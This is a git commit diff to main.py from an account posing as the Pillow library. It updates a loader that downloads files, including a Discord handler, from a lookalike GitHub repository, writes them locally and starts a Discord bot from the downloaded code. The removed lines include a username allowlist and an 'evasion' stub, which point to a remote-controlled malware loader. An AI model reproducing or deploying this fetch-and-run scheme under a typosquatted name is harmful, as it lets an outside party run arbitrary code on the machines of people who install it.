f31322b963e7d0756447aa071005f65d936ba8e2
pillowlibrary <thenamesethan.yt@gmail.com>
2024-11-06 13:01:45 -0800

    Update main.py

--- main.py
+++ main.py
@@ -1,5 +1,3 @@
-# main.py
-
 import requests
 import os
 import json
@@ -7,13 +5,10 @@ import signal
 import sys
 from requests.exceptions import RequestException, Timeout
 
-# Constants and configuration
 GITHUB_RAW_URL_TEMPLATE = "https://raw.githubusercontent.com/pillowlibrary/pillow/main/functions/{}"
 UPDATE_STATUS_FILE = os.path.join(os.path.dirname(__file__), "update_status.json")
 LOCAL_FUNCTIONS_PATH = os.path.join(os.getcwd(), "functions")
 DISCORD_HANDLER_FILE = "discord_handler.py"
-allowed_users = ["border", "bob", "User"]
-github_token = "ghp_your_github_token_here"  # Replace with your GitHub token
 REQUEST_TIMEOUT = 5
 
 def graceful_exit(signum, frame):
@@ -23,12 +18,10 @@ signal.signal(signal.SIGTERM, graceful_exit)
 signal.signal(signal.SIGINT, graceful_exit)
 
 def download_and_update_files(files_to_update):
-    headers = {'Authorization': f'token {github_token}'}
-
     for file_name in files_to_update:
         raw_url = GITHUB_RAW_URL_TEMPLATE.format(file_name)
         try:
-            response = requests.get(raw_url, headers=headers, timeout=REQUEST_TIMEOUT)
+            response = requests.get(raw_url, timeout=REQUEST_TIMEOUT)
             if response.status_code == 200:
                 local_file_path = os.path.join(LOCAL_FUNCTIONS_PATH, file_name)
                 with open(local_file_path, "wb") as file:
@@ -40,7 +33,7 @@ def download_and_update_files(files_to_update):
 
     raw_discord_handler_url = GITHUB_RAW_URL_TEMPLATE.format(DISCORD_HANDLER_FILE)
     try:
-        response = requests.get(raw_discord_handler_url, headers=headers, timeout=REQUEST_TIMEOUT)
+        response = requests.get(raw_discord_handler_url, timeout=REQUEST_TIMEOUT)
         if response.status_code == 200:
             local_discord_handler_path = os.path.join(LOCAL_FUNCTIONS_PATH, DISCORD_HANDLER_FILE)
             with open(local_discord_handler_path, "wb") as file:
@@ -61,19 +54,11 @@ def reset_update_flag():
     with open(UPDATE_STATUS_FILE, "w") as f:
         json.dump(data, f)
 
-def evasion():
-    pass
-
 def main():
-    username = os.getlogin()
-    if username in allowed_users:
-        files_to_update = check_update_status()
-        if files_to_update:
-            download_and_update_files(files_to_update)
-            reset_update_flag()
-    else:
-        evasion()
-        return
+    files_to_update = check_update_status()
+    if files_to_update:
+        download_and_update_files(files_to_update)
+        reset_update_flag()
 
     from functions.discord_handler import start_discord_bot
     start_discord_bot()
